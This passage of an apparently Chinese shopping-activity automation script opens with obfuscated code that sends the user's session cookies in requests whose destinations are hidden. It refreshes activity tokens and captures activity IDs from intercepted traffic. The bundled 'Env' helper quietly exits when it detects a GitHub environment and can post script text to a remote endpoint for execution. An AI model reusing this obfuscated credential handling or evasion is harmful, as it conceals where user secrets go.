_0x3211ce={'\x75\x72\x6c':_0x2a05('c7'),'\x68\x65\x61\x64\x65\x72\x73':{'\x41\x63\x63\x65\x70\x74':_0x2a05('bc'),'Accept-Encoding':_0x2a05('84'),'Accept-Language':_0x2a05('85'),'\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e':_0x2a05('86'),'\x48\x6f\x73\x74':_0x2a05('bd'),'\x4f\x72\x69\x67\x69\x6e':_0x2a05('be'),'Content-Type':_0x2a05('bf'),'\x52\x65\x66\x65\x72\x65\x72':activityUrl+_0x2a05('c8')+activityId,'\x43\x6f\x6f\x6b\x69\x65':cookie+activityCookie+_0x2a05('b5')+$[_0x2a05('3c')]+_0x2a05('b6')+$[_0x2a05('42')],'User-Agent':$['\x55\x41']},'\x62\x6f\x64\x79':_0x2a05('c9')+encodeURIComponent(encodeURIComponent($[_0x2a05('3d')]))+_0x2a05('ca')+activityId+_0x2a05('cb')+activityId+_0x2a05('cc')};$[_0x2a05('5e')](_0x3211ce,(_0x19edd2,_0x424082,_0x4f415a)=>{try{if(_0x19edd2){console[_0x2a05('13')](''+JSON[_0x2a05('a')](_0x19edd2));console[_0x2a05('13')]($[_0x2a05('1f')]+_0x2a05('c3'));}else{if(_0x424082[_0x2a05('61')]==0xc8){refreshToken(_0x424082);}}}catch(_0x4faa05){$[_0x2a05('5b')](_0x4faa05,_0x424082);}finally{_0x51b71c();}});});}function refreshToken(_0x469be2){let _0x2ccf54=_0x469be2[_0x2a05('52')][_0x2a05('53')];if(_0x2ccf54){activityCookie=_0x2ccf54[_0x2a05('18')](_0x50d70c=>{return _0x50d70c[_0x2a05('56')]('\x3b')[0x0];})[_0x2a05('cd')]('\x3b');}}function jsonParse(_0xb7d747){if(typeof strv==_0x2a05('ce')){try{return JSON[_0x2a05('6a')](_0xb7d747);}catch(_0x273a57){console[_0x2a05('13')](_0x273a57);$[_0x2a05('1e')]($[_0x2a05('1f')],'',_0x2a05('cf'));return[];}}}function GetCookie(){if($request[_0x2a05('d0')][_0x2a05('b')](_0x2a05('77'))>-0x1){if($request[_0x2a05('d1')]){let _0x4c829f=$request[_0x2a05('d1')][_0x2a05('28')](/activityId=([a-zA-Z0-9._-]+)/);if(_0x4c829f){let _0x32bcbf=$request[_0x2a05('d0')][_0x2a05('56')]('\x2f');console[_0x2a05('13')](_0x2a05('d2')+_0x4c829f[0x1]);console[_0x2a05('13')](_0x2a05('d3')+_0x32bcbf[0x0]+'\x2f\x2f'+_0x32bcbf[0x2]);$[_0x2a05('d4')](_0x4c829f[0x1],_0x2a05('5'));$[_0x2a05('d4')](_0x32bcbf[0x0]+'\x2f\x2f'+_0x32bcbf[0x2],_0x2a05('6'));$[_0x2a05('1e')]($[_0x2a05('1f')],_0x2a05('d5'),_0x2a05('d6')+_0x4c829f[0x1]+_0x2a05('d7')+_0x32bcbf[0x0]+'\x2f\x2f'+_0x32bcbf[0x2]);}else{$[_0x2a05('1e')]($[_0x2a05('1f')],_0x2a05('d8'),'');}}}};;_0xodz='jsjiami.com.v6';

// prettier-ignore
function Env(t, e) {
    "undefined" != typeof process && JSON.stringify(process.env).indexOf("GITHUB") > -1 && process.exit(0);

    class s {
        constructor(t) {
            this.env = t
        }

        send(t, e = "GET") {
            t = "string" == typeof t ? {url: t} : t;
            let s = this.get;
            return "POST" === e && (s = this.post), new Promise((e, i) => {
                s.call(this, t, (t, s, r) => {
                    t ? i(t) : e(s)
                })
            })
        }

        get(t) {
            return this.send.call(this.env, t)
        }

        post(t) {
            return this.send.call(this.env, t, "POST")
        }
    }

    return new class {
        constructor(t, e) {
            this.name = t, this.http = new s(this), this.data = null, this.dataFile = "box.dat", this.logs = [], this.isMute = !1, this.isNeedRewrite = !1, this.logSeparator = "\n", this.startTime = (new Date).getTime(), Object.assign(this, e), this.log("", `${this.name}, 开始!`)
        }

        isNode() {
            return "undefined" != typeof module && !!module.exports
        }

        isQuanX() {
            return "undefined" != typeof $task
        }

        isSurge() {
            return "undefined" != typeof $httpClient && "undefined" == typeof $loon
        }

        isLoon() {
            return "undefined" != typeof $loon
        }

        toObj(t, e = null) {
            try {
                return JSON.parse(t)
            } catch {
                return e
            }
        }

        toStr(t, e = null) {
            try {
                return JSON.stringify(t)
            } catch {
                return e
            }
        }

        getjson(t, e) {
            let s = e;
            const i = this.getdata(t);
            if (i) try {
                s = JSON.parse(this.getdata(t))
            } catch {
            }
            return s
        }

        setjson(t, e) {
            try {
                return this.setdata(JSON.stringify(t), e)
            } catch {
                return !1
            }
        }

        getScript(t) {
            return new Promise(e => {
                this.get({url: t}, (t, s, i) => e(i))
            })
        }

        runScript(t, e) {
            return new Promise(s => {
                let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
                i = i ? i.replace(/\n/g, "").trim() : i;
                let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
                r = r ? 1 * r : 20, r = e && e.timeout ? e.timeout : r;
                const [o, h] = i.split("@"), n = {
                    url: `http://${h}/v1/scripting/evaluate`,
                    body: {script_text: t, mock_type: "cron", timeout: r},
                    headers: {"X-Key": o, Accept: "*/*"}
                };
                this.post(n, (t, e, i) => s(i))
            }).catch(t => this.logErr(t))
        }

        loaddata() {
            if (!this.isNode()) return {};
            {
                this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path");
                const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile),
                    s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e);
                if (!s && !i) return {};
                {
                    const i = s ? t : e;
                    try {
                        return JSON.parse(this.fs.readFileSync(i))
                    } catch (t) {
                        return {}
                    }
                }
            }
        }

        writedata() {
            if (this.isNode()) {
                this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path");
                const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile),
                    s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e), r = JSON.stringify(this.data);
                s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r)
            }
        }

        lodash_get(t, e, s) {
            const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
            let r = t;
            for (const t of i) if (r = Object(r)[t], void 0 === r) return s;
            return r
        }

        lodash_set(t, e, s) {
            return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t)
        }

        getdata(t) {
            let e = this.getval(t);
            if (/^@/.test(t)) {
                const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t), r = s ? this.getval(s) : "";
                if (r) try {
                    const t = JSON.parse(r);
                    e = t ? this.lodash_get(t, i, "") : e
                } catch (t) {
                    e = ""
                }
            }
            return e
        }

        setdata(t, e) {
            let s = !1;
            if (/^@/.test(e)) {
                const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e), o = this.getval(i),
                    h = i ? "null" === o ? null : o || "{}" : "{}";
                try {
                    const e = JSON.parse(h);
                    this.lodash_set(e, r, t), s = this.setval(JSON.stringify(e), i)
                } catch (e) {
                    const o = {};
                    this.lodash_set(o, r, t), s = this.setval(JSON.stringify(o), i)
                }
            } else s = this.setval(t, e);
            return s
        }

        getval(t) {
            return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null
        }

        setval(t, e) {
            return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null
        }

        initGotEnv(t) {
            this.got = this.got ? this.got : require("got"), this.cktough = this.cktough ? this.cktough : require("tough-cookie"), this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar, t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar))
        }

        get(t, e = (() => {
        })) {
            t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {"X-Surge-Skip-Scripting": !1})), $httpClient.get(t, (t, s, i) => {
                !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i)
            })) : this.isQuanX() ? (this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {hints: !1})), $task.fetch(t).then(t => {
                const {statusCode: s, statusCode: i, headers: r, body: o} = t;
                e(null, {status: s, statusCode: i, headers: r, body: o}, o)
            }, t => e(t))) : this.isNode() && (this.initGotEnv(t), this.got(t).on("redirect", (t, e) => {
                try {
                    if (t.headers["set-cookie"]) {
                        const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                        s && this.ckjar.setCookieSync(s, null), e.cookieJar = this.ckjar
                    }
                } catch (t) {
                    this.logErr(t)
                }
            }).then(t => {
                const {statusCode: s, statusCode: i, headers: r, body: o} = t;
                e(null, {status: s, statusCode: i, headers: r, body: o}, o)
            }, t => {
                const {message: s, response: i} = t;
                e(s, i, i && i.body)
            }))
        }

        post(t, e = (() => {
        })) {
            if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {"X-Surge-Skip-Scripting": !1})), $httpClient.post(t, (t, s, i) => {
                !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i)
            }); else if (this.isQuanX()) t.method = "POST", this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {hints: !1})), $task.fetch(t).then(t => {
                const {statusCode: s, statusCode: i, headers: r, body: o} = t;
                e(null, {status: s, statusCode: i, headers: r, body: o}, o)
            }, t => e(t)); else if (this.isNode()) {
                this.initGotEnv(t);
                const {url: s, ...i} = t;
                this.got.post(s, i).then(t => {
                    const {statusCode: s, statusCode: i, headers: r, body: o} = t;
                    e(null, {status: s, statusCode: i, headers: r, body: o}, o)
                }, t => {
                    const {message: s, response: i} = t;
                    e(s, i, i && i.body)
                })
            }
        }

        time(t, e = null) {
            const s = e ? new Date(e) : new Date;
            let i = {
                "M+": s.getMonth() + 1,
                "d+": s.getDate(),
                "H+": s.getHours(),
                "m+": s.getMinutes(),
                "s+": s.getSeconds(),
                "q+": Math.floor((s.getMonth() + 3) / 3),
                S: s.getMilliseconds()
            };
            /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
            for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
            return t
        }

        msg(e = t, s = "", i = "", r) {
            const o = t => {
                if (!t) return t;
                if ("string" == typeof t) return this.isLoon() ? t : this.isQuanX() ? {"open-url": t} : this.isSurge() ? {url: t} : void 0;
                if ("object" == typeof t) {
                    if (this.isLoon()) {
                        let e = t.openUrl || t.url || t["open-url"], s = t.mediaUrl || t["media-url"];
                        return {openUrl: e, mediaUrl: s}
                    }
                    if (this.isQuanX()) {
                        let e = t["open-url"] || t.url || t.openUrl, s = t["media-url"] || t.mediaUrl;
                        return {"open-url": e, "media-url": s}
                    }
                    if (this.isSurge()) {
                        let e = t.url || t.openUrl || t["open-url"];
                        return {url: e}
                    }
                }
            };
            if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
                let t = ["", "==============系统通知=============="];
                t.push(e), s && t.push(s), i && t.push(i), console.log(t.join("\n")), this.logs = this.logs.concat(t)
            }
        }

        log(...t) {
            t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.join(this.logSeparator))
        }

        logErr(t, e) {
            const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
            s ? this.log("", `${this.name}, 错误!`, t.stack) : this.log("", `${this.name}, 错误!`, t)
        }

        wait(t) {
            return new Promise(e => setTimeout(e, t))
        }

        done(t = {}) {
            const e = (new Date).getTime(), s = (e - this.startTime) / 1e3;
            this.log("", `${this.name}, 结束!  ${s} 秒`), this.log(), (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t)
        }
    }(t, e)
}
